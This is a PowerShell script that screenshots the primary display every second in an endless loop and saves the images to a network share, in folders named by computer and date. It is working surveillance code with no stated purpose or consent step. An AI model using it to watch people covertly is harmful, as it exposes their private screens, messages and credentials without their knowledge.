Add-Type -AssemblyName System.Windows.Forms, System.Drawing 
    
$destination = "\\HOME-PC\Share\"
if(!(Test-Path $destination)) {
    # server's not respond, do something
}

$destination += $env:COMPUTERNAME 
if(!(Test-Path $destination)) {
    New-Item -ItemType Directory -Force -Path $destination
}
$destination += "\" + (Get-Date -f dd.MM.yy)
if(!(Test-Path $destination)) {
    New-Item -ItemType Directory -Force -Path $destination
}

$screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds

while ($true) {

    Start-Sleep -Seconds 1 

    $image = New-Object System.Drawing.Bitmap ($screen.width), ($screen.height)
    $graphics = [Drawing.Graphics]::FromImage($image)
    $point = [Drawing.Point]::Empty

    $graphics.CopyFromScreen($point, $point, $image.Size)

    $image.Save(
        "$destination\$(Get-Date -f HH.mm.ss).png", 
        [Drawing.Imaging.ImageFormat]::Png
    )

    $graphics.Dispose()
    $image.Dispose()

}
